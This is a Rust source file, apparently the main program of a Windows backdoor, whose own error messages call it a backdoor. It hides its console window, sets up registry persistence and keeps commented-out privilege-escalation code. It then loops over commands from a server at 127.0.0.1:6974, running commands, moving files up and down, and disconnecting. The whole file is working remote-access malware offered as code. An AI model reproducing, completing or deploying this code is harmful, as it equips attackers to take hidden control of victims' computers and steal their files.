#![windows_subsystem = "windows"]

mod exploits;
mod stprotocol;
mod structure;

use crate::structure::StructStone;
use exploits::{is_elevated, setup_registry, try_run_as_admin, Exploits, Malware};
use std::thread;
use stprotocol::{Client, HandleClient, Session};
use structure::{Detector, Generator, StoneTransferProtocol};

fn main() {
    // if let p = !is_admin() {
    //     println!("관리자 권한 없음 {:?}", p);
    //     if is_elevated() {
    //         match try_run_as_admin() {
    //             Ok(_) => {}
    //             Err(_) => eprintln!("Exploitation failed: Starting backdoor with basic privileges"),
    //         }
    //     }
    // }

    match setup_registry() {
        Ok(_) => {}
        Err(_) => eprintln!(
            "Exploit Failure: Failed to register registry key, resulting in insecure execution."
        ),
    }

    let handle_server = thread::spawn(|| event_loop());

    handle_server
        .join()
        .expect("Connection to server is lost for unknown reasons. Backdoor terminated.");
}

fn event_loop() {
    let mut exploit = Exploits::default();
    let mut client = Session::new("127.0.0.1:6974".to_string());

    loop {
        // 새션 생성후 서버와 지속적인 통신을 위한 루프문

        client.receiving(StructStone::default()); //HandleClient::new(Session::new("127.0.0.1:6974".to_string())); // 핸들러 생성후 서버의 응답 대기

        match client.get_packet().get_type() {
            // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
            StoneTransferProtocol::ExecuteCmd => {
                // 타입이 ExecuteCmd 일 경우
                client.exploit(exploit.command(client.get_packet()));
            }
            StoneTransferProtocol::Download => {
                // 타입이 Download 일 경우
                client.download();
            }
            StoneTransferProtocol::Upload => {
                // 타입이 Upload 일 경우
                client.upload();
            }
            StoneTransferProtocol::Disconnect => {
                client.disconnect();
                break;
            } // 만약 서버의 응답이 Disconnect 일 경우 연결을 종료한다

            _ => client.send(client.get_packet().get_stone()), //만약 위의 응답 타입을 제외한 응답을 보낼경우 서버의 응답과 같은 요청을 전송함
        };
    }
}
